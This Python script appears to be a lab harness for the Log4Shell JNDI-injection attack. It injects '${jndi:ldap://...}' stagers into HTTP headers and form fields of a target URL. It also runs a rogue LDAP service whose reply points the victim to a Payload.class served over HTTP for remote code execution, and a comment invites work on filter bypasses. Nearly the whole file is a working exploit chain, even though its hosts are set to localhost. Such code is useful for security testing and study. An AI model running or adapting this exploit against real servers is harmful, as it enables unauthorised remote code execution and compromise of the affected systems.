#!/usr/bin/env python3

import os

import requests
from bs4 import BeautifulSoup

from horrors import (
    logging,
    scenarios,
    services,
    triggers,
)


JNDI_PORTS = (
    1389,
    1099,
)

HTTP_HEADERS = (
    'Accept-Language',
    'User-Agent',
    'X-Forwarded-For',
    'X-Forwarded-Host',
    'X-Requested-With',
)

TARGETS = [
    'http://127.0.0.1:8080/endpoint',
]


# NOTE: This is where you want to experiment with filter bypassing:

STAGERS = [
    '${{jndi:ldap://{rhost}/}}',  # NOTE: Double brackets escape for string formatting
    
]
for port in JNDI_PORTS:
    STAGERS.append('${{jndi:ldap://{rhost}:' + str(port) + '/}}')


JNDI_RESPONSE = """dn:
javaClassName: Payload
javaCodeBase: http://{rhost}:{rport}/payload
objectClass: javaNamingReference
javaFactory: Payload
"""


class JNDI(services.Service):

    async def handler(self, reader, writer):
        logging.info('{}:{} requested data, responding with payload...'.format(*reader._transport._sock.getpeername()))
        writer.write(
            JNDI_RESPONSE.format(**self.scenario.context).encode('utf-8')
        )
        await writer.drain()


async def send_requests(scenario):

    for stager in STAGERS:
        stager = stager.format(**scenario.context)
        headers = {header: stager for header in HTTP_HEADERS}
        for target in TARGETS:
            response = await scenario.http_get(
                target,
                headers,
            )
            if response:
                input_fields = BeautifulSoup(response, 'html.parser').find_all('input')
                if input_fields:
                    data = {field.name: stager for field in input_fields}
                    response = await scenario.http_post(
                        target,
                        data,
                        headers,
                    )


if __name__ == "__main__":

    context = {
        'rhost': '127.0.0.1',
        'rport': 8889,
    }

    story = scenarios.Scenario(**context)
    # story.set_proxy('http://127.0.0.1:8088')

    httpd = services.simple.http.HTTPStatic(story, address=context['rhost'], port=context['rport'])
    httpd.add_route('/', 'Welcome')
    httpd.add_route('/payload', open(os.path.join(os.path.dirname(__file__), 'Payload.class'), 'rb').read())

    story.set_debug()
    for port in JNDI_PORTS:
        JNDI(story, address=context['rhost'], port=port)
    story.add_scene(send_requests)
    story.play()
